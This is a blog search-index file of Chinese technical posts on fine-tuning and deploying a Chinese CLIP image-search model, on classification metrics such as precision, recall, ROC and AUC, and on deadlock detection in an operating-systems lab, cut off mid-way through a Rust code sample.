<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>机器学习-模型微调与部署</title>
      <link href="/2024/07/18/ji-qi-xue-xi-mo-xing-wei-diao-yu-bu-shu/"/>
      <url>/2024/07/18/ji-qi-xue-xi-mo-xing-wei-diao-yu-bu-shu/</url>
      
        <content type="html"><![CDATA[<h2 id="项目架构"><a href="#项目架构" class="headerlink" title="项目架构"></a><strong>项目架构</strong></h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">├── app.py├── Chinese-CLIP├── Data│     ├── datasets│     │     └── Kwai│     │           ├── lmdb│     │           ├── train_imgs.tsv│     │           ├── train_texts.jsonl│     │           ├── valid_imgs.tsv│     │           └── valid_texts.jsonl│     ├── deploy│     ├── experiments│     └── pretrained_weights├── database.py├── model.py├── RawData│     ├── *.csv│     ├── dataset.py│     ├── merged_output.csv│     ├── merge.py│     └── preprocess.py├── requirements.txt├── Scripts│     ├── eval_img_txt_feat.sh│     ├── extract_img_txt_feat.sh│     ├── extract_train_img_feat.sh│     ├── extract_valid_img_feat.sh│     ├── finetune_clip.sh│     ├── onnx_clip.sh│     └── tensor_clip.sh├── static├── templates└── Testcodes      ├── onnx.py      ├── tensor.py      └── version.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Anaconda-安装"><a href="#Anaconda-安装" class="headerlink" title="Anaconda 安装"></a><strong>Anaconda 安装</strong></h2><p>使用 arch 命令观察到物理机架构为 x86_64，从 <a href="https://repo.anaconda.com/archive/">Anaconda 官方</a>下载对应版本的安装脚本。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> <span class="token parameter variable">-c</span> <span class="token string">"https://repo.anaconda.com/archive/Anaconda3-2024.06-1-Linux-x86_64.sh"</span> --no-check-certificate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Torch-安装"><a href="#Torch-安装" class="headerlink" title="Torch 安装"></a><strong>Torch 安装</strong></h2><p>使用 <strong>nvidia-smi</strong> 命令查看物理机的 GPU 基础信息：</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202408141552529.png" alt=""></p><p>GPU 最高支持 11.4 版本的 CUDA，在 <a href="https://pytorch.org/get-started/previous-versions/">PyTorch 官方网站</a>上查找 CUDA-11.3 对应的 PyTorch 版本安装 (因为 CUDA-11.4 是一个奇怪的版本，没有对应的 PyTorch 版本支持)。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda create <span class="token parameter variable">-n</span> clip <span class="token assign-left variable">python</span><span class="token operator">==</span><span class="token number">3.9</span>pip <span class="token function">install</span> <span class="token assign-left variable">torch</span><span class="token operator">==</span><span class="token number">1.12</span>.1+cu113 <span class="token assign-left variable">torchvision</span><span class="token operator">==</span><span class="token number">0.13</span>.1+cu113 <span class="token assign-left variable">torchaudio</span><span class="token operator">==</span><span class="token number">0.12</span>.1 --extra-index-url https://download.pytorch.org/whl/cu113<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="模型下载与依赖安装"><a href="#模型下载与依赖安装" class="headerlink" title="模型下载与依赖安装"></a><strong>模型下载与依赖安装</strong></h2><p>选择使用大规模中文数据预训练的<a href="https://github.com/OFA-Sys/Chinese-CLIP">中文 Clip 模型</a>作为基座模型，进行微调。</p><p>使用 ssh 克隆仓库出现无法连接 GitHub 22 端口的报错，因此使用 https 克隆仓库。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/OFA-Sys/Chinese-CLIP.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装如下依赖：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">coremltools</span><span class="token operator">==</span><span class="token number">7.2</span><span class="token assign-left variable">Flask</span><span class="token operator">==</span><span class="token number">3.0</span>.3<span class="token assign-left variable">Flask_Cors</span><span class="token operator">==</span><span class="token number">4.0</span>.1<span class="token assign-left variable">jieba</span><span class="token operator">==</span><span class="token number">0.42</span>.1<span class="token assign-left variable">modelscope</span><span class="token operator">==</span><span class="token number">1.17</span>.1<span class="token assign-left variable">numpy</span><span class="token operator">==</span><span class="token number">1.24</span>.0<span class="token assign-left variable">onnxmltools</span><span class="token operator">==</span><span class="token number">1.11</span>.1<span class="token assign-left variable">onnxruntime_gpu</span><span class="token operator">==</span><span class="token number">1.13</span>.1<span class="token assign-left variable">pandas</span><span class="token operator">==</span><span class="token number">2.2</span>.2<span class="token assign-left variable">Pillow</span><span class="token operator">==</span><span class="token number">10.4</span>.0<span class="token assign-left variable">pinecone</span><span class="token operator">==</span><span class="token number">5.0</span>.1<span class="token assign-left variable">Requests</span><span class="token operator">==</span><span class="token number">2.32</span>.3<span class="token assign-left variable">setuptools</span><span class="token operator">==</span><span class="token number">69.5</span>.1<span class="token assign-left variable">six</span><span class="token operator">==</span><span class="token number">1.16</span>.0<span class="token assign-left variable">tensorrt</span><span class="token operator">==</span><span class="token number">8.2</span>.5.1<span class="token assign-left variable">timm</span><span class="token operator">==</span><span class="token number">1.0</span>.8<span class="token assign-left variable">torch</span><span class="token operator">==</span><span class="token number">1.12</span>.1+cu113<span class="token assign-left variable">torchvision</span><span class="token operator">==</span><span class="token number">0.13</span>.1+cu113<span class="token assign-left variable">tqdm</span><span class="token operator">==</span><span class="token number">4.66</span>.4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="数据集构建-Reference"><a href="#数据集构建-Reference" class="headerlink" title="数据集构建 [Reference]"></a><strong>数据集构建</strong> <a href="https://github.com/OFA-Sys/Chinese-CLIP/blob/master/README.md#数据集格式预处理">[Reference]</a></h2><p>从以 CSV 格式存储的 200w 量级的数据集中过滤出图片 id，标题与 url，格式如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">405482801733,205</span>肥肥佳人时尚胶片百搭鞋,https://u1-203.ecukwai.com/bs2/image-kwaishop-product/item_image-493137733-d2b1fdad3bb94f9a8f2cd7720a9ffcbb.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 <strong>RawData/dataset.py</strong> 中实现了 <strong>ImageProcessor</strong> 与 <strong>TextProcessor 类</strong>，分别将图片原始文件转换为 base64 格式，标题拆分为关键词组并过滤无关字符，最终构建映射关系，并分别保存在 <strong>Data/datasets/Kwai/*.tsv</strong> 与 <strong>Data/datasets/Kwai/*.jsonl</strong> 中。</p><p>使用如下命令将 tsv 和 jsonl 文件序列化，转换为内存索引的 LMDB 数据库文件，以方便训练时的随机读取：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python Chinese-CLIP/cn_clip/preprocess/build_lmdb_dataset.py <span class="token punctuation">\</span>    <span class="token parameter variable">--data_dir</span> DATA/datasets/kwai    <span class="token parameter variable">--splits</span> train,valid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>最终生成的数据集组织如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└── Data      └── datasets             └── Kwai                   ├── lmdb                   ├── train_imgs.tsv                   ├── train_texts.jsonl                   ├── valid_imgs.tsv                   └── valid_texts.jsonl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="模型微调-Reference"><a href="#模型微调-Reference" class="headerlink" title="模型微调 [Reference]"></a><strong>模型微调</strong> <a href="https://github.com/OFA-Sys/Chinese-CLIP/blob/master/README.md#模型finetune">[Reference]</a></h2><p>参考 <strong>Scripts/finetune_clip.sh</strong> 进行模型微调。</p><h2 id="Pinecone-向量数据库部署-Reference"><a href="#Pinecone-向量数据库部署-Reference" class="headerlink" title="Pinecone 向量数据库部署 [Reference]"></a><strong>Pinecone 向量数据库部署</strong> <a href="https://docs.pinecone.io/guides/get-started/quickstart">[Reference]</a></h2><p>安装 Pinecone For Python：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> <span class="token string">"pinecone-client[grpc]"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>为将数据集中的图片批量存入数据库，先运行脚本 <strong>Scripts/extract_train_img_feat.sh</strong> 和 <strong>Scripts/extract_valid_img_feat.sh</strong> 将 base64 格式的图片数据向量化。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Scripts/extract_train_img_feat.sh</span><span class="token assign-left variable">resume</span><span class="token operator">=</span>Data/pretrained_weights/YOUR_MODELpython <span class="token parameter variable">-u</span> Chinese-CLIP/cn_clip/eval/extract_features.py <span class="token punctuation">\</span>    --extract-image-feats <span class="token punctuation">\</span>    --image-data<span class="token operator">=</span><span class="token string">"Data/datasets/Kwai/lmdb/train/imgs"</span> <span class="token punctuation">\</span>    --image-feat-output-path<span class="token operator">=</span><span class="token string">"Data/datasets/Kwai/train_imgs.img_feat.jsonl"</span><span class="token punctuation">\</span>    --img-batch-size<span class="token operator">=</span><span class="token number">32</span> <span class="token punctuation">\</span>    --context-length<span class="token operator">=</span><span class="token number">52</span> <span class="token punctuation">\</span>    <span class="token parameter variable">--resume</span><span class="token operator">=</span><span class="token variable">${resume}</span> <span class="token punctuation">\</span>    --vision-model<span class="token operator">=</span>ViT-B-16<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考 Pinecone 官方文档，在 <strong>database.py</strong> 中实现了图片向量写入数据库以及数据库查询功能：</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202408141558108.png" alt=""></p><p>打开 Pinecone 网页端，观察到图片数据与 url 已经存入。</p><h2 id="模型部署与格式转换-Reference"><a href="#模型部署与格式转换-Reference" class="headerlink" title="模型部署与格式转换 [Reference]"></a><strong>模型部署与格式转换</strong> <a href="https://github.com/OFA-Sys/Chinese-CLIP/blob/master/deployment.md">[Reference]</a></h2><p>对 PyTorch 模型进行 ONNX &amp; TensorRT 格式的转换，以实现推理加速。首先需要注意 CUDA，ONNX 与 TensorRT 的版本匹配关系。</p><h3 id="ONNX-格式转换"><a href="#ONNX-格式转换" class="headerlink" title="ONNX 格式转换"></a><strong>ONNX 格式转换</strong></h3><p>安装 ONNX 库：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> <span class="token assign-left variable">onnx</span><span class="token operator">==</span><span class="token number">1.13</span>.0 onnxruntime-gpu<span class="token operator">==</span><span class="token number">1.13</span>.1 <span class="token assign-left variable">onnxmltools</span><span class="token operator">==</span><span class="token number">1.11</span>.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行脚本 <strong>Scripts/onnx_clip.sh</strong>，将 PyTorch 模型转换为 ONNX 格式：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python Chinese-CLIP/cn_clip/deploy/pytorch_to_onnx.py <span class="token punctuation">\</span>       --model-arch ViT-B-16 <span class="token punctuation">\</span>       --pytorch-ckpt-path Data/pretrained_weights/YOUR_MODEL <span class="token punctuation">\</span>       --save-onnx-path Data/deploy/vit-b-16/vit-b-16 <span class="token punctuation">\</span>       --convert-text --convert-vision<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="TensorRT-格式转换"><a href="#TensorRT-格式转换" class="headerlink" title="TensorRT 格式转换"></a><strong>TensorRT 格式转换</strong></h3><p>安装 TensorRT 库：</p><p>运行如下代码得到 CUDA 版本为 11.3，cuDNN 版本为 8.3.2。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> torch<span class="token keyword">print</span><span class="token punctuation">(</span>torch<span class="token punctuation">.</span>version<span class="token punctuation">.</span>cuda<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>torch<span class="token punctuation">.</span>backends<span class="token punctuation">.</span>cudnn<span class="token punctuation">.</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>TensorRT 的版本选择需要与 CUDA 与 cuDNN 严格兼容，在 <a href="https://developer.nvidia.com/nvidia-tensorrt-8x-download">NVIDIA 官方网站</a>安装相应的 TensorRT-8.2.5.1 版本，在本地下载安装包后使用 sftp 传输到物理机上。</p><p>使用的 Python 虚拟环境为 3.9，在有关目录下依次安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> tensorrt-8.2.5.1-cp39-none-linux_x86_64.whlpip <span class="token function">install</span> graphsurgeon-0.4.5-py2.py3-none-any.whlpip <span class="token function">install</span> onnx_graphsurgeon-0.3.12-py2.py3-none-any.whl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>添加如下环境变量到 .bashrc 中：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">LD_LIBRARY_PATH</span><span class="token operator">=</span><span class="token variable">$LD_LIBRARY_PATH</span>:~/TensorRT-8.2.5.1/lib<span class="token builtin class-name">export</span> <span class="token assign-left variable">LD_LIBRARY_PATH</span><span class="token operator">=</span><span class="token variable">$LD_LIBRARY_PATH</span>:~/anaconda3/envs/kwai/lib/python3.9/site-packages/torch/lib<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PATH</span>:~/TensorRT-8.2.5.1/bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>运行如下代码得到 TensorRT 版本为 8.2.5.1。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tensorrt <span class="token keyword">print</span><span class="token punctuation">(</span>tensorrt<span class="token punctuation">.</span>__version__<span class="token punctuation">)</span> <span class="token keyword">assert</span> tensorrt<span class="token punctuation">.</span>Builder<span class="token punctuation">(</span>tensorrt<span class="token punctuation">.</span>Logger<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>运行脚本 <strong>Scripts/tensor_clip.sh</strong>，将 ONNX 模型转换为 TensorRT 格式：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python Chinese-CLIP/cn_clip/deploy/onnx_to_tensorrt.py <span class="token punctuation">\</span>    --model-arch ViT-B-16 <span class="token punctuation">\</span>    --save-tensorrt-path Data/deploy/vit-b-16/vit-b-16 <span class="token punctuation">\</span>    --convert-text <span class="token punctuation">\</span>    --text-onnx-path Data/deploy/vit-b-16/YOUR_MODEL <span class="token punctuation">\</span>    --convert-vision <span class="token punctuation">\</span>    --vision-onnx-path Data/deploy/vit-b-16/YOUR_MODEL <span class="token punctuation">\</span>    <span class="token parameter variable">--fp16</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>转换时遇到了报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">'tensorrt.tensorrt.IBuilderConfig'</span> object has no attribute <span class="token string">'set_memory_pool_limit'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 <strong>Chinese-CLIP/cn_clip/deploy/tensorrt_utils.py</strong> 中第 147 行进行如下修改即可：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">-</span> config<span class="token punctuation">.</span>set_memory_pool_limit<span class="token punctuation">(</span>trt<span class="token punctuation">.</span>tensorrt<span class="token punctuation">.</span>MemoryPoolType<span class="token punctuation">.</span>DLA_GLOBAL_DRAM<span class="token punctuation">,</span> workspace_size<span class="token punctuation">)</span><span class="token operator">+</span> config<span class="token punctuation">.</span>max_workspace_size <span class="token operator">=</span> workspace_size<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="系统运行流程"><a href="#系统运行流程" class="headerlink" title="系统运行流程"></a><strong>系统运行流程</strong></h2><ol><li>用户访问<a href="https://kwaipic.corp.kuaishou.com/home">网页</a>，在前端上传一张图片。</li><li>后端对图片进行 resize，并由 TensorRT 模型推理得到特征向量。</li><li>后端通过特征向量查询 Pinecone 数据库，得到相似度较高的图片 id 与 url，并在前端展示。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202408141559904.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202408141559141.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202408141559318.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Machine Learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习-模型转换(1)</title>
      <link href="/2024/07/12/ji-qi-xue-xi-mo-xing-zhuan-huan/"/>
      <url>/2024/07/12/ji-qi-xue-xi-mo-xing-zhuan-huan/</url>
      
        <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=" "></a> </h2>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Machine Learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习-分类模型指标</title>
      <link href="/2024/07/02/ji-qi-xue-xi-fen-lei-mo-xing-zhi-biao/"/>
      <url>/2024/07/02/ji-qi-xue-xi-fen-lei-mo-xing-zhi-biao/</url>
      
        <content type="html"><![CDATA[<h2 id="分类问题"><a href="#分类问题" class="headerlink" title="分类问题"></a>分类问题</h2><p>有一个判断性别的机器学习模型, 使用它来判断「是否为男性」时, 会出现 4 种情况:</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202408021629912.png" alt=""></p><p>这 4 种情况构成了混淆矩阵:</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202408021631896.png" alt=""></p><p>其中 T/F 描述机器判断结果的正确性, P/N 描述机器判断分类的正负性.</p><h2 id="基础分类指标"><a href="#基础分类指标" class="headerlink" title="基础分类指标"></a>基础分类指标</h2><h3 id="准确率-Accuracy"><a href="#准确率-Accuracy" class="headerlink" title="准确率 Accuracy"></a>准确率 Accuracy</h3><p><strong>准确率</strong>为预测正确的结果占总样本的百分比:</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202408071617941.png" alt=""></p><p>可以判断总的正确率, 但是在<strong>样本不平衡</strong>的情况下, 不能作为指标来衡量结果. 在正样本占 90%, 负样本占 10% 的总样本中, 样本严重不平衡. 这种情况只需将全部样本预测为正即可得到 90% 的准确率, 结果含有水分, 准确率失效.</p><h3 id="查准率-Precision"><a href="#查准率-Precision" class="headerlink" title="查准率 Precision"></a>查准率 Precision</h3><p><strong>查准率</strong>为所有被<u>预测为正</u>的样本中<u>实际为正</u>的样本的概率:</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202408071631976.png" alt=""></p><p>查准率代表对<strong>正样本结果</strong>中的预测准确程度, 有多少把握预测正确; 而准确率则代表<strong>整体</strong>的预测准确程度, 包括正样本和负样本.</p><h3 id="查全率-Recall"><a href="#查全率-Recall" class="headerlink" title="查全率 Recall"></a>查全率 Recall</h3><p><strong>查全率</strong>为所有<u>实际为正</u>的样本中被<u>预测为正</u>的样本的概率:</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202408081033339.png" alt=""></p><p>查全率越高, 代表实际用户被预测出来的概率越高.</p><h3 id="F1分数-F1-Score"><a href="#F1分数-F1-Score" class="headerlink" title="F1分数 F1$_$Score"></a>F1分数 F1$_$Score</h3><p>Precision 和 Recall 之间的关系用 P-R 曲线来表达:</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202408081046768.jpg" alt=""></p><p>以逻辑回归举例, 输出是一个 0 到 1 之间的概率数字, 根据这个概率判断用户好坏, 必须定义一个<strong>阈值</strong>. 为了找到一个最合适的阈值满足我们的要求, 必须遍历 0 到 1 之间所有的阈值, 每个阈值下都对应着一对 Precision 和 Recall, 从而得到了这条曲线.</p><p>想要找到二者之间的<strong>平衡点</strong>, 就需要一个新的指标 <strong>F1$_$Score</strong>. F1$_$Score 同时考虑了 Precision 和 Recall, 让二者同时达到最高, 公式为:</p><script type="math/tex; mode=display">\text{F1\_Score}=\dfrac{2*\text{Precision}*\text{Recall}}{\text{Precision}+\text{Recall}}</script><p>P-R 曲线的两个指标都<strong>聚焦于正样本</strong>, 适合评估在相同的类别分布下正例的预测情况.</p><h2 id="样本不平衡处理"><a href="#样本不平衡处理" class="headerlink" title="样本不平衡处理"></a>样本不平衡处理</h2><h3 id="灵敏度-Sensitivity-特异度-Specificity-真正率-TPR-假正率-FPR"><a href="#灵敏度-Sensitivity-特异度-Specificity-真正率-TPR-假正率-FPR" class="headerlink" title="灵敏度 Sensitivity/特异度 Specificity/真正率 TPR/假正率 FPR"></a>灵敏度 Sensitivity/特异度 Specificity/真正率 TPR/假正率 FPR</h3><p>以下指标能<strong>无视样本不平衡</strong>:</p><script type="math/tex; mode=display">\text{Sensitivity}=\dfrac{\text{TP}}{\text{TP}+\text{FN}},\quad\text{Specificity}=\dfrac{\text{TN}}{\text{FP}+\text{TN}}</script><p>Sensitivity 为实际为正的样本被预测为正的概率, Specificity 为实际为负的样本被预测为负的概率. 由于关心正样本, 所以使用 1 - Specificity, 查看负样本被错误预测为正的概率.</p><script type="math/tex; mode=display">\text{TPR}=\text{Sensitivity}=\dfrac{\text{TP}}{\text{TP}+\text{FN}},\quad\text{FPR}=1-\text{Specificity}=\dfrac{\text{FP}}{\text{FP}+\text{TN}}</script><p>TPR 和 FPR 分别<strong>从实际表现的各个结果角度出发</strong>, 在实际的正样本和负样本中来观察相关概率, <strong>无论样本是否平衡</strong>, 都不会被影响. TPR 只关注正样本中有多少被真正覆盖, FPR 只关注负样本中有多少被错误覆盖的.</p><h3 id="从「条件概率」说起"><a href="#从「条件概率」说起" class="headerlink" title="从「条件概率」说起"></a>从「条件概率」说起</h3><p>假设 X 为预测值, Y 为真实值, 可以将这些指标按条件概率表示:</p><script type="math/tex; mode=display">\begin{aligned}&\text{Precision}=\Pr(Y=1|X=1)\\&\text{Recall}=\text{Sensitivity}=\Pr(X=1|Y=1)\\&\text{Specificity}=\Pr(X=0|Y=0)\end{aligned}</script><p>如果先以实际结果为条件 (Recall/Sensitivity/Specificity), 就只需考虑一种样本; 而先以预测值为条件 (Precision), 需要同时考虑正样本和负样本. 所以<strong>先以实际结果为条件</strong>的指标都<strong>不受样本不平衡的影响</strong>, 相反<strong>以预测结果为条件</strong>就会<strong>受到样本不平衡的影响</strong>.</p><h3 id="接受者操作特征曲线-ROC"><a href="#接受者操作特征曲线-ROC" class="headerlink" title="接受者操作特征曲线 ROC"></a>接受者操作特征曲线 ROC</h3><p><strong>ROC 曲线</strong>的横坐标为假正率 FPR, 纵坐标为真正率 TPR:</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202408081120109.jpg" alt=""></p><p>与 P-R 曲线类似, ROC 曲线也通过<strong>遍历所有阈值</strong>来绘制:</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202408081122132.gif" alt=""></p><p><strong>改变阈值</strong>只是改变预测的正负样本数, 即 TPR 和 FPR, 但是曲线本身不变. FPR 表示模型虚报的响应程度, 而 TPR 表示模型预测响应的覆盖程度. <strong>TPR 越高</strong>, 同时 <strong>FPR 越低</strong>, 即 ROC 曲线越陡, 那么模型性能越好:</p><p><img src="https://cdn.jsdelivr.net/gh/chengsx21/ImageBed/pic/202408081123478.gif" alt=""></p><p>当测试集中的<strong>正负样本的分布变化</strong>时, TPR 和 FPR 能无视样本不平衡, ROC 曲线<strong>聚焦于整体</strong>, 保持不变, 使其成为较均衡的评估方法.</p><h3 id="曲线下面积-AUC"><a href="#曲线下面积-AUC" class="headerlink" title="曲线下面积 AUC"></a>曲线下面积 AUC</h3><p>为了计算 ROC 曲线上的点, 可以使用不同的分类阈值多次评估逻辑回归模型, 但效率非常低. 一种基于排序的高效算法可以提供此类信息, 称为 <strong>AUC</strong>.</p><p>可以断言, AUC 越大, 模型效果越好. <strong>随机判断响应与否</strong>, 正负样本覆盖率都是 50%, 表示随机效果, 对应的 ROC 曲线即对角线. 在最坏情况下总有 TPR=FPR, 即 AUC = 0.5; 如果AUC &lt; 0.5, 只要取反预测类别, 便得到了 AUC &gt; 0.5 的分类器.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Machine Learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统 Lab 5</title>
      <link href="/2024/06/09/cao-zuo-xi-tong-lab-5/"/>
      <url>/2024/06/09/cao-zuo-xi-tong-lab-5/</url>
      
        <content type="html"><![CDATA[<h1 id="Lab-5"><a href="#Lab-5" class="headerlink" title="Lab 5"></a>Lab 5</h1><h2 id="功能实现"><a href="#功能实现" class="headerlink" title="功能实现"></a>功能实现</h2><h3 id="sys-enable-deadlock-detect"><a href="#sys-enable-deadlock-detect" class="headerlink" title="sys_enable_deadlock_detect"></a><code>sys_enable_deadlock_detect</code></h3><ol><li>修改 <code>ProcessControlBlockInner</code> 结构体, 为 <code>mutex</code> 和 <code>semaphore</code> 分别实现死锁检测算法所需的数据结构.</li><li>为 <code>ProcessControlBlockInner</code> 结构体实现 <code>fn deadlock_detect()</code> 进行死锁检测.</li><li><code>sys_thread_create()</code> 创建新线程时, 更新 <code>allocation</code> 与 <code>need</code>.</li><li><code>sys_mutex_create()</code> 和 <code>sys_semaphore_create()</code> 创建资源后, 更新 <code>available</code> 的大小, 扩展 <code>allocation</code> 与 <code>need</code>.</li><li><code>sys_mutex_lock()</code> 和 <code>sys_semaphore_down()</code> 申请资源时, 将 <code>need</code> 增加, 并进行死锁检测, 通过后减少 <code>need</code>, 减少 <code>available</code> 并增加 <code>allocation</code> 以使用资源.</li><li><code>sys_mutex_unlock()</code>和<code>sys_semaphore_up()</code> 归还资源, 将 <code>available</code> 增加, <code>allocation</code> 减少以释放资源.</li></ol><h2 id="实验用时"><a href="#实验用时" class="headerlink" title="实验用时"></a>实验用时</h2><ol><li>阅读文档及代码框架: 2h.</li><li>功能实现与报告: 2.5h.</li></ol><h2 id="问答题"><a href="#问答题" class="headerlink" title="问答题"></a>问答题</h2><ol><li><p><strong>在我们的多线程实现中, 当主线程 (即 0 号线程) 退出时, 视为整个进程退出, 此时需要结束该进程管理的所有线程并回收其资源. 需要回收的资源有哪些? 其他线程的 TaskControlBlock 可能在哪些位置被引用, 分别是否需要回收, 为什么?</strong></p><p> 答: (1) 回收所有子线程的 <code>TaskUserRes</code>, 包括用户栈, Trap 上下文以及进程 <code>pid</code>, 回收子进程列表以及用户空间数据. (2) 其他线程的 TaskControlBlock 可能在调度队列或等待某些同步原语时被引用, 无需回收, 会在主线程回收时一起回收.</p></li></ol><ol><li><p><strong>对比以下两种 <code>Mutex.unlock</code> 的实现, 二者有什么区别? 这些区别可能会导致什么问题?</strong></p> <pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">impl</span> <span class="token class-name">Mutex</span> <span class="token keyword">for</span> <span class="token class-name">Mutex1</span> <span class="token punctuation">{</span>    <span class="token keyword">fn</span> <span class="token function-definition function">unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> mutex_inner <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>inner<span class="token punctuation">.</span><span class="token function">exclusive_access</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert!</span><span class="token punctuation">(</span>mutex_inner<span class="token punctuation">.</span>locked<span class="token punctuation">)</span><span class="token punctuation">;</span>        mutex_inner<span class="token punctuation">.</span>locked <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>waking_task<span class="token punctuation">)</span> <span class="token operator">=</span> mutex_inner<span class="token punctuation">.</span>wait_queue<span class="token punctuation">.</span><span class="token function">pop_front</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">add_task</span><span class="token punctuation">(</span>waking_task<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">impl</span> <span class="token class-name">Mutex</span> <span class="token keyword">for</span> <span class="token class-name">Mutex2</span> <span class="token punctuation">{</span>    <span class="token keyword">fn</span> <span class="token function-definition function">unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> <span class="token 